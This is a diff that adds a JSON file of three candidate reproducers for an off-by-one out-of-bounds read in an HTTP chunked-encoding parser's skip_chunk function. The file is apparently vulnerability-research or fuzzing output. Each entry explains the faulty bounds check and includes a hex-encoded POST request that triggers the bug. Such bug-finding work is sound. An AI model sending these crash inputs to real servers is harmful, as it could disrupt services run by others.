@@ -1,0 +1,43 @@
+{
+  "candidates": [
+    {
+      "id": "skip_chunk_oob_read_minimal",
+      "title": "Off-by-one OOB read in skip_chunk when CR is last byte of the buffered chunk-size line (missing LF)",
+      "triggering_conditions": "Request uses Transfer-Encoding: chunked. After headers, the buffered body begins with one or more hex digits immediately followed by a single CR as the last available byte (no LF yet). Total available len >= 3 so skip_chunk runs. Example body: \"10\\r\".",
+      "expected_observable_failure": "One-byte out-of-bounds read of buf[i+1] in skip_chunk (condition: len < i + 1 || buf[i] != '\\r' || buf[i + 1] != '\\n'), because len == i + 1 and buf[i] == '\\r'. Typically detected as AddressSanitizer heap-buffer-overflow read or possible crash.",
+      "evidence": "In skip_chunk: if (len < i + 1 || buf[i] != '\\r' || buf[i + 1] != '\\n') ... The bound check uses len < i + 1 but then unconditionally reads buf[i + 1]. With i == len - 1 and buf[i] == '\\r', this reads one byte past the end. http_cb calls skip_chunk with len = c->recv.len - ofs - n; supplying only the digits and a trailing CR (no LF) makes i == len - 1 and triggers the OOB read.",
+      "request": {
+        "encoding": "hex",
+        "data": "504f5354202f20485454502f312e310d0a486f73743a20780d0a5472616e736665722d456e636f64696e673a206368756e6b65640d0a0d0a31300d"
+      },
+      "notes": "Minimal body '10\\r' makes len == 3 and i == 2 (len - 1). Keep the connection open or close immediately; the OOB read occurs as soon as the body is parsed.",
+      "confidence": 0.9
+    },
+    {
+      "id": "skip_chunk_oob_read_zero_size_variant",
+      "title": "Same OOB read with zero-size chunk-size line missing LF ('00\\r')",
+      "triggering_conditions": "Transfer-Encoding: chunked; body starts with two hex digits '00' followed by CR as the last buffered byte (no LF). len == 3 so skip_chunk executes; i == len - 1 and buf[i] == '\\r'.",
+      "expected_observable_failure": "One-byte out-of-bounds read of buf[i+1] in skip_chunk, observable via ASAN/Valgrind or crash.",
+      "evidence": "Identical code path as the minimal case; the value of the hex length does not matter because the OOB occurs before mg_str_to_num is reached.",
+      "request": {
+        "encoding": "hex",
+        "data": "504f5354202f20485454502f312e310d0a486f73743a20780d0a5472616e736665722d456e636f64696e673a206368756e6b65640d0a0d0a30300d"
+      },
+      "notes": "Uses zero-size '00\\r' to demonstrate the issue is independent of the intended chunk length.",
+      "confidence": 0.88
+    },
+    {
+      "id": "skip_chunk_oob_read_long_hex_variant",
+      "title": "OOB read with long hex size ending in CR (boundary near sizeof(int)*2), e.g. 'FFFFFFFF\\r'",
+      "triggering_conditions": "Transfer-Encoding: chunked; body begins with 8 hex digits followed by a CR as the last buffered byte. On typical 32-bit int (sizeof(int) == 4), i == 8 which passes the check (i > sizeof(int)*2) is false; len == 9 and i == len - 1; buf[i] == '\\r'.",
+      "expected_observable_failure": "One-byte out-of-bounds read of buf[i+1] in skip_chunk, prior to any length conversion.",
+      "evidence": "The CRLF check happens before mg_str_to_num, so the OOB read is hit even for large sizes. The threshold check uses '>' not '>=', so i == 8 is allowed and still triggers the missing LF path.",
+      "request": {
+        "encoding": "hex",
+        "data": "504f5354202f20485454502f312e310d0a486f73743a20780d0a5472616e736665722d456e636f64696e673a206368756e6b65640d0a0d0a46464646464646460d"
+      },
+      "notes": "Demonstrates that the issue is not prevented by the size-limit guard; it occurs before length parsing.",
+      "confidence": 0.85
+    }
+  ]
+}
